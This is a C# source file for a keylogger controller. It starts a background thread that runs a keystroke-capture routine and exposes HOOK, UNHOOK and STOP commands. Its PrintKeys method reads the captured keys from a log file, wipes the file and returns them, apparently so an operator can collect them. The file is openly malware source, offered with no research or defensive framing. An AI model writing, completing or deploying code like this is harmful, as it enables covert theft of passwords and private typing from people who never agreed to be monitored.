using KeyLogger;

class KeylogController
{
    private Thread worker;
    private CancellationTokenSource cts;
    private ManualResetEvent pauseEvent = new ManualResetEvent(false);

    public void Start()
    {
        cts = new CancellationTokenSource();

        worker = new Thread(() => Run(cts.Token));
        worker.IsBackground = true;
        worker.Start();

        Console.WriteLine("Keylogger thread created (paused)");
    }

    private void Run(CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            // Wait until HOOK (resume)
            pauseEvent.WaitOne();

            // Call your keylogger logic
            KeyLogger.InterceptKeys.startKLog();
        }
    }

    public void Hook()
    {
        Console.WriteLine("HOOK");
        File.WriteAllText(appstart.path, "");
        pauseEvent.Set(); // resume
    }

    public void Unhook()
    {
        Console.WriteLine("UNHOOK");
        pauseEvent.Reset(); // pause
    }

    public void Stop()
    {
        Console.WriteLine("STOP");
        cts.Cancel();
        pauseEvent.Set();
    }

    public string PrintKeys()
    {
        string s = File.Exists(appstart.path)
            ? File.ReadAllText(appstart.path)
            : "";

        File.WriteAllText(appstart.path, "");

        if (string.IsNullOrEmpty(s))
            s = "\0";

        return s;
    }
}